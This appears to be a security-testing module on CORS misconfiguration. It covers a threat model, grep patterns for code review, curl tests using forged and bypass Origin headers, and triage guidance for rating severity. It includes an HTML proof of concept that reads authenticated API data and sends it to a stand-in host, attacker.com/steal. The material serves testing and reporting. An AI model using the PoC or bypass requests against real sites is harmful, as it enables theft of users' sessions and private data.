# VULN MODULE — CORS Misconfiguration
# Asset: webapp
# Report ID prefix: WEB-CORS

## THREAT MODEL

CORS controls which origins can read cross-origin responses via XMLHttpRequest/fetch.
Misconfigurations allow attacker pages to read authenticated responses,
exfiltrating session data, API keys, CSRF tokens, and private user data.

Critical condition: the endpoint must:
  1. Return sensitive data in the response body
  2. Reflect the attacker's origin in Access-Control-Allow-Origin
  3. Have Access-Control-Allow-Credentials: true

## WHITEBOX STATIC ANALYSIS

```bash
# CORS header generation
grep -rn "Access-Control-Allow-Origin\|allowedOrigins\|cors(" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.php" --include="*.java"

# Dangerous patterns
grep -rn "req\.headers\.origin\|request\.origin\|HTTP_ORIGIN" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.php"
# If origin is reflected directly into ACAO header → misconfiguration

grep -rn "Access-Control-Allow-Origin.*\*" \
  --include="*.conf" --include="*.js" --include="*.py"
# Wildcard is only dangerous if combined with credentials — but check anyway

# Regex-based origin validation (bypass candidates)
grep -rn "\.test.*origin\|\.match.*origin\|origin\.includes\|origin\.startsWith" \
  --include="*.js" --include="*.ts"
```

## BLACKBOX TESTING

```bash
# Test 1: arbitrary origin reflection
curl -s -I "https://target.com/api/user" \
  -H "Origin: https://attacker.com" \
  -H "Cookie: session=VALID_SESSION"
# Check: is Access-Control-Allow-Origin: https://attacker.com returned?
# Check: is Access-Control-Allow-Credentials: true returned?

# Test 2: null origin (sandboxed iframe bypass)
curl -s -I "https://target.com/api/user" \
  -H "Origin: null" \
  -H "Cookie: session=VALID_SESSION"

# Test 3: subdomain bypass
curl -s -I "https://target.com/api/user" \
  -H "Origin: https://evil.target.com" \
  -H "Cookie: session=VALID_SESSION"

# Test 4: prefix/suffix bypass
curl -s -I "https://target.com/api/user" \
  -H "Origin: https://target.com.attacker.com" \
  -H "Cookie: session=VALID_SESSION"
```

### Exploitation PoC
```html
<!DOCTYPE html>
<html>
<body>
<script>
fetch('https://target.com/api/user', {
  credentials: 'include'  // sends session cookie
})
.then(r => r.json())
.then(data => {
  // Exfiltrate sensitive data
  fetch('https://attacker.com/steal?d=' + encodeURIComponent(JSON.stringify(data)));
});
</script>
</body>
</html>
```

## TRIAGE NOTE

CORS wildcard (*) without credentials:
  → Only valid if endpoint returns sensitive data accessible to anonymous users
  → Most of the time: Informative

CORS reflecting arbitrary origin WITH credentials:
  → High (authenticated data exfiltration)
  → Must show the sensitive data in the response body — "it reflects origin" alone = NMI
